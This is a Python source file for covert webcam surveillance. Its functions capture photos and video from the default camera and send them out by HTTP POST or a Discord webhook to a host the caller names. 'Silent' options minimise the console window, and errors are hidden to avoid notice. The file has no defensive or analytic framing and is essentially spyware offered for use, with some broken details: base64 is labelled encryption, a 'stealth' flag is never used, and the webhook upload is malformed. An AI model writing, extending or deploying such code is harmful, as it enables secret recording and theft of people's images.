import cv2
import requests
import base64
import json
import ctypes

def capture_image(output_path='capture.jpg', stealth=False, silent=False, testing=False):
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(output_path, frame)
        cam.release()
        if testing:
            print("Image captured.")
    except Exception as e:
        if testing:
            print(f"Error capturing image: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def record_video(output_path='capture.avi', duration=10, stealth=False, silent=False, testing=False):
    try:
        cam = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_path, fourcc, 20.0, (640, 480))
        start_time = cv2.getTickCount()
        while True:
            ret, frame = cam.read()
            if not ret:
                break
            out.write(frame)
            elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
            if elapsed_time > duration:
                break
        cam.release()
        out.release()
        if testing:
            print("Video recorded.")
    except Exception as e:
        if testing:
            print(f"Error recording video: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def exfiltrate_image(image_path, target, encrypt=False, stealth=False, silent=False, testing=False):
    try:
        with open(image_path, 'rb') as f:
            image_data = f.read()
        if encrypt:
            image_data = base64.b64encode(image_data).decode()
        if target.startswith('http'):
            requests.post(target, data={'image': image_data})
        elif target.startswith('discord'):
            webhook_url = target
            data = {"content": f"Image exfiltrated", "files": [("image.jpg", image_data)]}
            requests.post(webhook_url, files=data)
        elif target == 'file':
            with open('exfiltrated_image.jpg', 'wb') as f:
                f.write(image_data)
        if testing:
            print(f"Image exfiltrated to {target}")
    except Exception as e:
        if testing:
            print(f"Error exfiltrating image: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window

def exfiltrate_video(video_path, target, encrypt=False, stealth=False, silent=False, testing=False):
    try:
        with open(video_path, 'rb') as f:
            video_data = f.read()
        if encrypt:
            video_data = base64.b64encode(video_data).decode()
        if target.startswith('http'):
            requests.post(target, data={'video': video_data})
        elif target.startswith('discord'):
            webhook_url = target
            data = {"content": f"Video exfiltrated", "files": [("video.avi", video_data)]}
            requests.post(webhook_url, files=data)
        elif target == 'file':
            with open('exfiltrated_video.avi', 'wb') as f:
                f.write(video_data)
        if testing:
            print(f"Video exfiltrated to {target}")
    except Exception as e:
        if testing:
            print(f"Error exfiltrating video: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window